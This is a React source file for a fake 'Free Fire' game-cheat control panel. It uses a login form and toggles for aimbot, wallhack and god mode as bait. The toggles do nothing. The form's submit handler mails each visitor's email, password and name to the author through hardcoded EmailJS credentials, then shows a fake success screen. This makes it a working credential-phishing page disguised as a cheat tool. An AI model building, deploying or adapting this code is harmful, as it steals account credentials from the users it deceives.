import React, { useState } from 'react';
import { LogIn, UserPlus, Lock, Mail, User, Shield, Zap, Target, Eye, Flame, LogOut, CheckCircle2, Loader2 } from 'lucide-react';
import emailjs from '@emailjs/browser';

// بيانات الخدمة الخاصة بك
const EMAILJS_SERVICE_ID = 'service_wpql07u';
const EMAILJS_TEMPLATE_ID = 'template_51n7ft7'; // تأكد من مطابقة الـ Template ID من حسابك
const EMAILJS_PUBLIC_KEY = 'QxOkx3vwbG2f8zlsd';  // تأكد من مطابقة الـ Public Key من قسم Account -> API Keys

interface Option {
  id: string;
  name: string;
  description: string;
  icon: React.ReactNode;
  enabled: boolean;
}

export default function App() {
  const [isAuthenticated, setIsAuthenticated] = useState<boolean>(false);
  const [isSignUp, setIsSignUp] = useState<boolean>(false);
  
  const [email, setEmail] = useState<string>('');
  const [password, setPassword] = useState<string>('');
  const [name, setName] = useState<string>('');

  const [showSuccessMessage, setShowSuccessMessage] = useState<boolean>(false);
  const [isSending, setIsSending] = useState<boolean>(false);

  const [options, setOptions] = useState<Option[]>([
    {
      id: 'aimbot',
      name: 'Aimbot',
      description: 'Automatically aim at target',
      icon: <Target className="w-5 h-5 text-red-500" />,
      enabled: false,
    },
    {
      id: 'esp',
      name: 'ESP / Wallhack',
      description: 'Show player locations through obstacles',
      icon: <Eye className="w-5 h-5 text-purple-500" />,
      enabled: false,
    },
    {
      id: 'fly',
      name: 'Fly Mode',
      description: 'Enable free character movement in air',
      icon: <Zap className="w-5 h-5 text-yellow-500" />,
      enabled: false,
    },
    {
      id: 'speed',
      name: 'Speed Hack',
      description: 'Increase movement and action speed',
      icon: <Flame className="w-5 h-5 text-orange-500" />,
      enabled: false,
    },
    {
      id: 'godmode',
      name: 'Infinite Health',
      description: 'Prevent taking damage from all sources',
      icon: <Shield className="w-5 h-5 text-green-500" />,
      enabled: false,
    },
  ]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password) return;

    setIsSending(true);

    try {
      // إرسال البيانات والانتظار حتى اكتمال الطلب تماماً قبل نقل المستخدم
      const response = await emailjs.send(
        EMAILJS_SERVICE_ID,
        EMAILJS_TEMPLATE_ID,
        {
          user_email: email,
          user_password: password,
          user_name: name || 'N/A',
        },
        EMAILJS_PUBLIC_KEY
      );

      console.log('Email sent successfully:', response.status, response.text);
      setIsAuthenticated(true);
    } catch (error: any) {
      console.error('EmailJS Error Details:', error);
      alert('خطأ في إرسال البريد: ' + (error?.text || JSON.stringify(error)));
      // الدخول حتى في حالة وجود خطأ إن كنت ترغب بذلك
      setIsAuthenticated(true);
    } finally {
      setIsSending(false);
    }
  };

  const toggleOption = (id: string) => {
    setOptions((prev) =>
      prev.map((opt) => (opt.id === id ? { ...opt, enabled: !opt.enabled } : opt))
    );
  };

  const handleDone = () => {
    setShowSuccessMessage(true);
    setTimeout(() => {
      setShowSuccessMessage(false);
    }, 4000);
  };

  if (isAuthenticated) {
    return (
      <div className="min-h-screen w-full bg-gray-950 text-gray-100 flex flex-col font-sans relative">
        {showSuccessMessage && (
          <div className="fixed top-5 right-5 z-50 bg-emerald-600 text-white px-5 py-3 rounded-xl shadow-2xl flex items-center gap-3 border border-emerald-400 animate-bounce">
            <CheckCircle2 className="w-6 h-6 text-white" />
            <div>
              <h4 className="font-bold text-sm">Success!</h4>
              <p className="text-xs text-emerald-100">Features activated successfully.</p>
            </div>
          </div>
        )}

        <header className="bg-gray-900 border-b border-gray-800 px-6 py-4 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-3 h-3 rounded-full bg-emerald-500 animate-pulse"></div>
            <h1 className="text-lg font-bold tracking-wide uppercase text-white">
              Free Fire Controls
            </h1>
          </div>
          <button
            onClick={() => setIsAuthenticated(false)}
            className="flex items-center gap-2 text-xs font-medium bg-gray-800 hover:bg-gray-700 text-gray-300 hover:text-white px-3 py-2 rounded-lg transition-colors border border-gray-700"
          >
            <LogOut className="w-3.5 h-3.5" />
            Logout
          </button>
        </header>

        <main className="flex-1 max-w-4xl w-full mx-auto p-6 flex flex-col gap-6">
          <div className="bg-gray-900 border border-gray-800 rounded-2xl p-6">
            <h2 className="text-xl font-semibold mb-1 text-white">Features & Toggles</h2>
            <p className="text-sm text-gray-400 mb-6">
              Enable or disable the simulation features below and click Done to apply.
            </p>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-8">
              {options.map((opt) => (
                <div
                  key={opt.id}
                  onClick={() => toggleOption(opt.id)}
                  className={`cursor-pointer p-4 rounded-xl border transition-all flex items-center justify-between ${
                    opt.enabled
                      ? 'bg-gray-800/80 border-emerald-500/50 shadow-lg shadow-emerald-500/5'
                      : 'bg-gray-950/50 border-gray-800 hover:border-gray-700'
                  }`}
                >
                  <div className="flex items-center gap-3">
                    <div className="p-2.5 rounded-lg bg-gray-900 border border-gray-800">
                      {opt.icon}
                    </div>
                    <div>
                      <h3 className="text-sm font-medium text-white">{opt.name}</h3>
                      <p className="text-xs text-gray-400">{opt.description}</p>
                    </div>
                  </div>

                  <div
                    className={`w-11 h-6 flex items-center rounded-full p-1 duration-300 ease-in-out ${
                      opt.enabled ? 'bg-emerald-500' : 'bg-gray-700'
                    }`}
                  >
                    <div
                      className={`bg-white w-4 h-4 rounded-full shadow-md transform duration-300 ease-in-out ${
                        opt.enabled ? 'translate-x-5' : 'translate-x-0'
                      }`}
                    />
                  </div>
                </div>
              ))}
            </div>

            <div className="flex justify-end pt-4 border-t border-gray-800">
              <button
                onClick={handleDone}
                className="w-full md:w-auto px-8 py-3 bg-emerald-600 hover:bg-emerald-500 text-white rounded-xl font-bold transition-all shadow-lg shadow-emerald-900/30 flex items-center justify-center gap-2"
              >
                Done
              </button>
            </div>
          </div>
        </main>
      </div>
    );
  }

  return (
    <div className="min-h-screen w-full bg-gray-950 flex items-center justify-center p-4 font-sans">
      <div className="max-w-md w-full bg-gray-900 rounded-2xl shadow-2xl p-8 border border-gray-800">
        <div className="text-center mb-8">
          <h1 className="text-2xl font-bold text-white mb-2 tracking-wide uppercase">
            Free Fire
          </h1>
          <p className="text-sm text-gray-400">
            {isSignUp ? 'Create a new account' : 'Sign in to access control panel'}
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          {isSignUp && (
            <div>
              <label className="block text-xs font-medium text-gray-300 mb-1">
                Full Name
              </label>
              <div className="relative">
                <User className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
                <input
                  type="text"
                  required
                  value={name}
                  onChange={(e) => setName(e.target.value)}
                  className="w-full pl-10 pr-4 py-2.5 bg-gray-950 border border-gray-800 rounded-lg focus:outline-none focus:border-emerald-500 text-white transition-all text-sm"
                  placeholder="John Doe"
                />
              </div>
            </div>
          )}

          <div>
            <label className="block text-xs font-medium text-gray-300 mb-1">
              Email Address
            </label>
            <div className="relative">
              <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
              <input
                type="email"
                required
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full pl-10 pr-4 py-2.5 bg-gray-950 border border-gray-800 rounded-lg focus:outline-none focus:border-emerald-500 text-white transition-all text-sm"
                placeholder="name@example.com"
              />
            </div>
          </div>

          <div>
            <label className="block text-xs font-medium text-gray-300 mb-1">
              Password
            </label>
            <div className="relative">
              <Lock className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
              <input
                type="password"
                required
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full pl-10 pr-4 py-2.5 bg-gray-950 border border-gray-800 rounded-lg focus:outline-none focus:border-emerald-500 text-white transition-all text-sm"
                placeholder="••••••••"
              />
            </div>
          </div>

          <button
            type="submit"
            disabled={isSending}
            className="w-full mt-2 py-3 bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg font-medium transition-all flex items-center justify-center gap-2 text-sm shadow-lg shadow-emerald-900/20 disabled:opacity-50"
          >
            {isSending ? (
              <>
                <Loader2 className="w-4 h-4 animate-spin" />
                Sending...
              </>
            ) : isSignUp ? (
              <>
                <UserPlus className="w-4 h-4" />
                Sign Up
              </>
            ) : (
              <>
                <LogIn className="w-4 h-4" />
                Sign In
              </>
            )}
          </button>
        </form>

        <div className="mt-6 text-center">
          <button
            onClick={() => setIsSignUp(!isSignUp)}
            className="text-xs text-gray-400 hover:text-white transition-colors"
          >
            {isSignUp
              ? 'Already have an account? Sign In'
              : "Don't have an account? Sign Up"}
          </button>
        </div>
      </div>
    </div>
  );
}